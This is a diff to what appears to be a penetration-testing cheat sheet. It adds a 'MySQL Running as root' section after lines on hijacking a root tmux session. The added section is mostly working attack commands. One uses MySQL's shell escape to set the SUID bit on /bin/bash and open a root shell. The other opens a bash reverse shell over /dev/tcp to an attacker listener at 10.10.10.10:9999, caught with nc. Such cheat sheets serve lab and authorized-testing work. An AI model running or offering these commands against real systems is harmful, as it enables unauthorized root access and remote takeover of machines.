@@ -872,3 +872,35 @@ tmux list-sessions                        // Any Tmux sessions running as root?
 /tmp/tmux-14/default-root                 // Root Tmux Session
 tmux -S /opt/.dev/gbm/ attach -t 0        // Replace Path to Session (Depending on your results)
 ```
+
+# MySQL Running as root
+
+Example 1
+```
+ps aux | grep root
+
+mysql -u root -p
+
+\! chmod +s /bin/bash
+exit
+ls -la /bin/bash                          // Verify that the SUID bit is set
+/bin/bash -p 
+id && whoami
+```
+
+Example 2
+
+Victim
+```
+ps aux | grep root
+
+mysql -u root -p
+
+\! bash -i >& /dev/tcp/10.10.10.10/9999 0>&1
+```
+Attacker
+
+```
+nc -lvnp 9999
+id && whoami
+```
